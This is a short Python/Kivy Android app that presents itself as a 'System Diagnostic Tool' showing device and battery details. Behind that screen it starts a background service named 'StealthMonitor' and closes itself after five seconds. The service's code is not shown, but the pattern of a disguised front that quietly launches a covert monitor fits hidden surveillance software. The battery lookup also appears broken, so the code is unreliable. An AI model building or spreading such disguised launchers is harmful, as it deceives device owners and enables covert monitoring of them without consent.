import time
import threading
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass
from android import service

Build = autoclass('android.os.Build')
VERSION = autoclass('android.os.Build$VERSION')
PowerManager = autoclass('android.os.PowerManager')
Context = autoclass('android.content.Context')

class MainApp(App):
    def build(self):
        try:
            activity = autoclass('org.kivy.android.PythonActivity').mActivity
            pm = activity.getSystemService(Context.POWER_SERVICE)
            battery = pm.getIntProperty(pm.BATTERY_PROPERTY_CAPACITY)
        except:
            battery = "N/A"

        layout = BoxLayout(orientation='vertical', padding=20, spacing=10)
        
        info = (
            f"[b]System Diagnostic Tool[/b]\n\n"
            f"Device: {Build.MANUFACTURER} {Build.MODEL}\n"
            f"Android Version: {VERSION.RELEASE} (API {VERSION.SDK_INT})\n"
            f"Battery: {battery}%\n"
        )
        label = Label(text=info, markup=True, halign='center', valign='middle')
        layout.add_widget(label)

        # محاولة بدء الخدمة
        try:
            service.start_service('StealthMonitor', '')
            label.text += "\n[color=00ff00]✅ Background service started[/color]"
        except Exception as e:
            label.text += f"\n[color=ff0000]❌ Service error: {str(e)}[/color]"
        
        Clock.schedule_once(self.close_app, 5)
        return layout
    
    def close_app(self, dt):
        self.stop()

if __name__ == '__main__':
    MainApp().run()
